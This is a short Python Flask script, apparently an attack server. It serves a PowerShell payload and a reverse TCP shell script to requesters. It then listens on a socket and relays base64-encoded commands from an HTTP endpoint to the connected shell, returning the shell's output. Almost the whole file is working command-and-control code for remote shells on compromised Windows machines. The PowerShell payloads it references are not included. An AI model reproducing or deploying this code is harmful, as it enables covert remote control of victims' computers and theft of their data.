# This file gives an example of sending the attack payload back to the target

from flask import *
import base64
from threading import Thread, Lock
from Queue import Queue
from socket import *

app = Flask('__main__')
queue = None
lock = Lock()

def openFile(path, name):
	content = ''
	with open('%s\\%s'%(path, name), 'rt') as file:
		content = file.read()
	return content

@app.route('/', methods = ['GET'])
def root():
	return openFile('.', 'payload.ps1')

@app.route('/index', methods = ['GET'])
def index():
	return send_from_directory('./html', 'shell.html')

@app.route('/revsh', methods = ['GET'])
def reverseShell():
	global queue
	global instip
	ip = request.environ['REMOTE_ADDR']
	port = request.args.get('port')
	queue = Queue()
	Thread(target = revshell, args = (queue, ip, int(port), )).start()

	return '$address = "localhost"\n$port = %s\n'%port + openFile('.', 'reverse_tcp_shell.ps1')

@app.route('/send', methods = ['GET'])
def revShellHandler():
	global queue
	cmd = request.args.get('cmd')
	if queue:
		queue.put(cmd)
		lock.acquire()
		data = queue.get()
		lock.release()
		return data
	print 'Queue not init'
	return ''

def revshell(queue, ip_addr, port):
	print 'Thread created'
	s = socket(AF_INET, SOCK_STREAM)
	s.bind((ip_addr, port))
	s.listen(1)
	conn, addr = s.accept()
	while True:
		try:
			lock.acquire()
			cmd = queue.get()
			lock.release()
			conn.send(cmd + '\r\n')
			if cmd == base64.b64encode('exit'):
				raise
			content = ''
			while True:
				temp = conn.recv(1)				
				if temp == '\n':
					break
				content += temp
			queue.put(base64.b64decode(content).decode('UTF-8'))
		except:
			print 'Thread closed'
			queue.put('Exited')
			queue = None
			conn.close()
			s.close()
			break

if __name__ == '__main__':
	app.run(port = 80, debug = True, use_reloader = False)
